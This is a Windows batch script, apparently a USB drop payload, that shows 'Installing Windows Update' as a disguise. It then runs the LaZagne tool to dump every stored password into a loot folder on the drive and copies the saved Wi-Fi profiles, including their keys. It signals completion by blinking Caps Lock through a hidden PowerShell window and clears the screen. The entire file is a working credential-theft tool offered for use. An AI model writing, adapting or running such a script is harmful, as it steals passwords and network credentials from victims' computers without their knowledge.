@echo off
@echo Installing Windows Update

setlocal
cd /d %~dp0

REM Time and Date
set drec=%COMPUTERNAME%_%date%_%time%
set dst=%~dp0\..\..\loot\USB_Exfiltration\%drec%
mkdir %dst% >>nul

REM This executes LaZagne in the current directory and outputs the password file to Loot
%~dp0\laZagne.exe all -v > "%~dp0\..\..\loot\USB_Exfiltration\%drec%\passwords.txt"


if Exist c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\* (
xcopy /C /Q /G /Y /E c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\* %dst% >>nul
)

REM Blink CAPSLOCK key
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"

@cls
@exit
